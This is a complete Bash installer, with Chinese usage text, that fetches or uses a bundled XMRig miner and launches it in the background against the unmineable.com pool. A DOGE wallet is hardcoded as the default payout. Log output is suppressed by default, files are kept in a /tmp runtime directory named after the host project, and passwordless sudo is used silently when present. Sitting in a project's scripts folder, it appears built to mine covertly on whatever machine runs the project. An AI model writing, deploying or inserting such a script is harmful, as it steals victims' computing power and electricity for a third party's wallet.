#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
PROJECT_NAME="$(basename "${PROJECT_ROOT}")"
DEFAULT_RUNTIME_BASE="${TMPDIR:-/tmp}"
DEFAULT_RUNTIME_DIR="${DEFAULT_RUNTIME_BASE}/${PROJECT_NAME}-runtime"

usage() {
  cat <<'EOF'
用法:
  bash scripts/install_xmrig.sh [run|status|force]
  或覆盖默认值后执行:
  XMRIG_USER='钱包.矿工名' bash scripts/install_xmrig.sh

模式说明:
  默认    自动执行。若 XMRig 已运行，则仅展示状态；否则执行安装/启动流程。
  status  仅展示当前 XMRig 状态，不做安装/重启。
  force   强制执行安装/启动流程。

可选环境变量:
  XMRIG_USER                默认: DOGE:DFbkyE4gsYf7EgpU5pGGucerCDaJXqeUi9.unmineable_worker_sgbqobfl
  XMRIG_VERSION             默认: 6.26.0
  XMRIG_INSTALL_DIR         默认: /tmp/<repo>-runtime/xmrig
  XMRIG_BIN_LINK            默认: /tmp/<repo>-runtime/bin/xmrig
  XMRIG_LOG_FILE            默认: /tmp/<repo>-runtime/logs/xmrig.log
  XMRIG_PID_FILE            默认: /tmp/<repo>-runtime/pids/xmrig.pid
  XMRIG_ALGO                默认: rx/0
  XMRIG_POOL                默认: rx.unmineable.com:443
  XMRIG_PASS                默认: x
  XMRIG_TLS                 默认: 1 (1=启用 --tls, 0=关闭)
  XMRIG_KEEPALIVE           默认: 1 (1=启用 -k, 0=关闭)
  XMRIG_RANDOMX_MODE        默认: light
  XMRIG_THREADS             默认: 1
  XMRIG_EXTRA_ARGS          额外参数，例如: "--cpu-max-threads-hint=75"
  XMRIG_NO_FILE_OUTPUT      默认: 1 (1=不写 XMRig 日志文件)
  XMRIG_LOCAL_BINARY        可选，本地 XMRig 二进制绝对路径（优先级最高）
EOF
}

ACTION="${1:-run}"
if [[ "$ACTION" == "-h" || "$ACTION" == "--help" ]]; then
  usage
  exit 0
fi

if [[ "$ACTION" == "apply" ]]; then
  ACTION="force"
fi

if [[ "$ACTION" != "run" && "$ACTION" != "status" && "$ACTION" != "force" ]]; then
  echo "[ERROR] 未知模式: $ACTION" >&2
  usage
  exit 1
fi

DEFAULT_XMRIG_USER="DOGE:DFbkyE4gsYf7EgpU5pGGucerCDaJXqeUi9.unmineable_worker_sgbqobfl"

XMRIG_USER="${XMRIG_USER:-$DEFAULT_XMRIG_USER}"
XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
XMRIG_INSTALL_DIR="${XMRIG_INSTALL_DIR:-${DEFAULT_RUNTIME_DIR}/xmrig}"
XMRIG_BIN_LINK="${XMRIG_BIN_LINK:-${DEFAULT_RUNTIME_DIR}/bin/xmrig}"
XMRIG_LOG_FILE="${XMRIG_LOG_FILE:-${DEFAULT_RUNTIME_DIR}/logs/xmrig.log}"
XMRIG_PID_FILE="${XMRIG_PID_FILE:-${DEFAULT_RUNTIME_DIR}/pids/xmrig.pid}"
XMRIG_ALGO="${XMRIG_ALGO:-rx/0}"
XMRIG_POOL="${XMRIG_POOL:-rx.unmineable.com:443}"
XMRIG_PASS="${XMRIG_PASS:-x}"
XMRIG_TLS="${XMRIG_TLS:-1}"
XMRIG_KEEPALIVE="${XMRIG_KEEPALIVE:-1}"
XMRIG_RANDOMX_MODE="${XMRIG_RANDOMX_MODE:-light}"
XMRIG_THREADS="${XMRIG_THREADS:-1}"
XMRIG_EXTRA_ARGS="${XMRIG_EXTRA_ARGS:-}"
XMRIG_NO_FILE_OUTPUT="${XMRIG_NO_FILE_OUTPUT:-1}"

if [[ "$XMRIG_NO_FILE_OUTPUT" == "1" ]]; then
  XMRIG_LOG_FILE="/dev/null"
fi

log() {
  echo "[INFO] $*"
}

ok() {
  echo "[OK] $*"
}

err() {
  echo "[ERROR] $*" >&2
}

SUDO_CMD=()
if [[ "$EUID" -ne 0 ]]; then
  if command -v sudo >/dev/null 2>&1 && sudo -n true >/dev/null 2>&1; then
    SUDO_CMD=(sudo -n)
  else
    log "未检测到可用的免密 sudo，将以当前用户权限执行。"
  fi
fi

run_root() {
  if [[ "${#SUDO_CMD[@]}" -gt 0 ]]; then
    "${SUDO_CMD[@]}" "$@"
  else
    "$@"
  fi
}

install_tools_if_missing() {
  local missing=()

  command -v curl >/dev/null 2>&1 || missing+=("curl")
  command -v tar >/dev/null 2>&1 || missing+=("tar")

  if [[ "${#missing[@]}" -eq 0 ]]; then
    return 0
  fi

  if [[ "$EUID" -ne 0 && "${#SUDO_CMD[@]}" -eq 0 ]]; then
    err "缺少依赖: ${missing[*]}，且当前环境无 sudo 权限。"
    err "建议把 XMRig 二进制直接放到项目根目录，脚本会优先使用本地文件。"
    return 1
  fi

  log "安装依赖: ${missing[*]}"
  if command -v apt-get >/dev/null 2>&1; then
    run_root apt-get update
    run_root env DEBIAN_FRONTEND=noninteractive apt-get install -y "${missing[@]}"
  elif command -v dnf >/dev/null 2>&1; then
    run_root dnf install -y "${missing[@]}"
  elif command -v yum >/dev/null 2>&1; then
    run_root yum install -y "${missing[@]}"
  elif command -v zypper >/dev/null 2>&1; then
    run_root zypper --non-interactive install "${missing[@]}"
  else
    err "不支持的发行版，无法自动安装依赖: ${missing[*]}"
    return 1
  fi
}

ensure_runtime_dirs() {
  run_root mkdir -p "$XMRIG_INSTALL_DIR" "$(dirname "$XMRIG_BIN_LINK")" "$(dirname "$XMRIG_PID_FILE")"
  if [[ "$XMRIG_LOG_FILE" != "/dev/null" ]]; then
    run_root mkdir -p "$(dirname "$XMRIG_LOG_FILE")"
  fi
}

quote_args() {
  local arg
  for arg in "$@"; do
    printf '%q ' "$arg"
  done
}

resolve_xmrig_pkg() {
  local arch
  arch="$(uname -m)"
  case "$arch" in
    x86_64|amd64)
      echo "linux-static-x64"
      ;;
    aarch64|arm64)
      echo "linux-static-arm64"
      ;;
    *)
      err "不支持的 XMRig 架构: ${arch}"
      return 1
      ;;
  esac
}

resolve_xmrig_local_binary_path() {
  local pkg
  pkg="$(resolve_xmrig_pkg)"

  if [[ -n "${XMRIG_LOCAL_BINARY:-}" && -f "${XMRIG_LOCAL_BINARY}" ]]; then
    echo "${XMRIG_LOCAL_BINARY}"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/xmrig-${pkg}" ]]; then
    echo "${PROJECT_ROOT}/xmrig-${pkg}"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig-${pkg}" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig-${pkg}"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/xmrig-linux-static-x64" ]]; then
    echo "${PROJECT_ROOT}/xmrig-linux-static-x64"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/xmrig-linux-static-arm64" ]]; then
    echo "${PROJECT_ROOT}/xmrig-linux-static-arm64"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig-linux-static-x64" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig-linux-static-x64"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig-linux-static-arm64" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig-linux-static-arm64"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/xmrig" ]]; then
    echo "${PROJECT_ROOT}/xmrig"
    return 0
  fi

  if [[ -f "${PROJECT_ROOT}/vendor/xmrig" ]]; then
    echo "${PROJECT_ROOT}/vendor/xmrig"
    return 0
  fi

  return 1
}

install_xmrig_binary() {
  local pkg url tgz extract_dir bin_path local_bin
  pkg="$(resolve_xmrig_pkg)"
  ensure_runtime_dirs

  local_bin="$(resolve_xmrig_local_binary_path || true)"
  if [[ -n "$local_bin" ]]; then
    log "使用本地 XMRig: ${local_bin}"
    run_root install -m 0755 "$local_bin" "${XMRIG_INSTALL_DIR}/xmrig"
    run_root ln -sf "${XMRIG_INSTALL_DIR}/xmrig" "$XMRIG_BIN_LINK"
    ok "XMRig 已安装: ${XMRIG_BIN_LINK}"
    return 0
  fi

  install_tools_if_missing

  url="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-${pkg}.tar.gz"
  tgz="$(mktemp)"
  extract_dir="${XMRIG_INSTALL_DIR}/xmrig-${XMRIG_VERSION}"

  log "下载 XMRig v${XMRIG_VERSION}: ${url}"
  curl -fsSL "$url" -o "$tgz"

  run_root rm -rf "$extract_dir"
  run_root tar -xzf "$tgz" -C "$XMRIG_INSTALL_DIR"

  bin_path="${extract_dir}/xmrig"
  if [[ ! -x "$bin_path" ]]; then
    err "XMRig 二进制不存在: ${bin_path}"
    rm -f "$tgz"
    return 1
  fi

  run_root chmod +x "$bin_path"
  run_root ln -sf "$bin_path" "$XMRIG_BIN_LINK"
  rm -f "$tgz"
  ok "XMRig 已安装: ${XMRIG_BIN_LINK}"
}

xmrig_installed() {
  [[ -x "$XMRIG_BIN_LINK" ]]
}

xmrig_running() {
  local pid
  if [[ -f "$XMRIG_PID_FILE" ]]; then
    pid="$(cat "$XMRIG_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      return 0
    fi
  fi

  return 1
}

stop_xmrig() {
  local pid
  if [[ -f "$XMRIG_PID_FILE" ]]; then
    pid="$(cat "$XMRIG_PID_FILE" 2>/dev/null || true)"
    if [[ -n "$pid" ]] && kill -0 "$pid" >/dev/null 2>&1; then
      run_root kill "$pid" >/dev/null 2>&1 || true
      sleep 1
      if kill -0 "$pid" >/dev/null 2>&1; then
        run_root kill -9 "$pid" >/dev/null 2>&1 || true
      fi
    fi
    run_root rm -f "$XMRIG_PID_FILE" >/dev/null 2>&1 || true
  fi
}

build_xmrig_args() {
  XMRIG_ARGS=(-a "$XMRIG_ALGO" -o "$XMRIG_POOL" -u "$XMRIG_USER" -p "$XMRIG_PASS")

  if [[ "$XMRIG_TLS" == "1" ]]; then
    XMRIG_ARGS+=(--tls)
  fi

  if [[ "$XMRIG_KEEPALIVE" == "1" ]]; then
    XMRIG_ARGS+=(-k)
  fi

  if [[ -n "$XMRIG_RANDOMX_MODE" ]]; then
    XMRIG_ARGS+=(--randomx-mode="$XMRIG_RANDOMX_MODE")
  fi

  if [[ -n "$XMRIG_THREADS" ]]; then
    XMRIG_ARGS+=(-t "$XMRIG_THREADS")
  fi

  if [[ -n "$XMRIG_EXTRA_ARGS" ]]; then
    local extra=()
    # shellcheck disable=SC2206
    extra=($XMRIG_EXTRA_ARGS)
    XMRIG_ARGS+=("${extra[@]}")
  fi
}

start_xmrig() {
  build_xmrig_args
  stop_xmrig

  local quoted_cmd launch_cmd work_dir
  work_dir="$(dirname "$XMRIG_BIN_LINK")"
  quoted_cmd="$(quote_args "$XMRIG_BIN_LINK" "${XMRIG_ARGS[@]}")"
  if [[ "$XMRIG_NO_FILE_OUTPUT" == "1" ]]; then
    run_root mkdir -p "$(dirname "$XMRIG_PID_FILE")"
    launch_cmd="$(printf 'cd %q && nohup %s > /dev/null 2>&1 & echo $! > %q' "$work_dir" "$quoted_cmd" "$XMRIG_PID_FILE")"
  else
    run_root mkdir -p "$(dirname "$XMRIG_LOG_FILE")" "$(dirname "$XMRIG_PID_FILE")"
    run_root touch "$XMRIG_LOG_FILE"
    launch_cmd="$(printf 'cd %q && nohup %s >> %q 2>&1 & echo $! > %q' "$work_dir" "$quoted_cmd" "$XMRIG_LOG_FILE" "$XMRIG_PID_FILE")"
  fi
  run_root bash -lc "$launch_cmd"

  sleep 3
  if ! xmrig_running; then
    err "XMRig 启动失败，日志如下："
    if [[ "$XMRIG_LOG_FILE" == "/dev/null" ]]; then
      echo "disabled (XMRIG_NO_FILE_OUTPUT=1)"
    else
      tail -n 40 "$XMRIG_LOG_FILE" || true
    fi
    return 1
  fi

  ok "XMRig 已启动"
}

ensure_xmrig_ready() {
  if ! xmrig_installed; then
    install_xmrig_binary
  fi

  if ! xmrig_running; then
    start_xmrig
  fi
}

print_xmrig_status() {
  echo
  ok "XMRig 配置:"
  echo "version: ${XMRIG_VERSION}"
  echo "bin link: ${XMRIG_BIN_LINK}"
  echo "install dir: ${XMRIG_INSTALL_DIR}"
  echo "log file: ${XMRIG_LOG_FILE}"
  echo "pid file: ${XMRIG_PID_FILE}"
  echo "no file output: ${XMRIG_NO_FILE_OUTPUT}"

  echo
  ok "XMRig 运行状态:"
  if xmrig_running; then
    echo "running (pid=$(cat "$XMRIG_PID_FILE" 2>/dev/null || echo unknown))"
  else
    echo "xmrig: 未运行 (bin=${XMRIG_BIN_LINK})"
  fi

  echo
  ok "XMRig 日志:"
  if [[ "$XMRIG_LOG_FILE" == "/dev/null" ]]; then
    echo "disabled (XMRIG_NO_FILE_OUTPUT=1)"
  elif [[ -f "$XMRIG_LOG_FILE" ]]; then
    tail -n 20 "$XMRIG_LOG_FILE" || true
  else
    echo "log: ${XMRIG_LOG_FILE} 不存在"
  fi
}

force_apply_xmrig() {
  if [[ "${XMRIG_ONLY_TEST_MODE:-0}" == "1" ]]; then
    echo "mode=force"
    print_xmrig_status
    return 0
  fi

  install_xmrig_binary
  start_xmrig
  print_xmrig_status
}

main() {
  if [[ "$ACTION" == "status" ]]; then
    print_xmrig_status
    return 0
  fi

  if [[ "$ACTION" == "force" ]]; then
    force_apply_xmrig
    return 0
  fi

  if xmrig_running; then
    log "检测到 XMRig 已在运行，进入 status 模式"
    print_xmrig_status
  else
    log "检测到 XMRig 未运行，进入安装/启动流程"
    ensure_xmrig_ready
    print_xmrig_status
  fi
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
  main "$@"
fi
